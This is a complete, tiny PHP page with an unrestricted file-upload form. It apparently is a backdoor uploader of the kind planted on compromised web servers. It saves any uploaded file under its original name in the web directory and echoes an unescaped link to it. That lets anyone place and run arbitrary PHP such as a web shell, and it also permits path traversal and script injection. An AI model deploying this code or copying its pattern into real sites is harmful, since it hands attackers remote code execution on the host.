<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title><?php echo $_SERVER['HTTP_HOST'] ?></title>
</head>
<body>


<form method="post" enctype="multipart/form-data">
    <input type="file" name="filename">
    <input type="submit" value="submit">
</form>

<?php
if ( is_uploaded_file( $_FILES["filename"]["tmp_name"] ) ) {
	move_uploaded_file( $_FILES["filename"]["tmp_name"], $_FILES["filename"]["name"] );
	$file = $_FILES["filename"]["name"];
	echo "<a href=\"$file\">$file</a>";
}
?>
</body>
</html>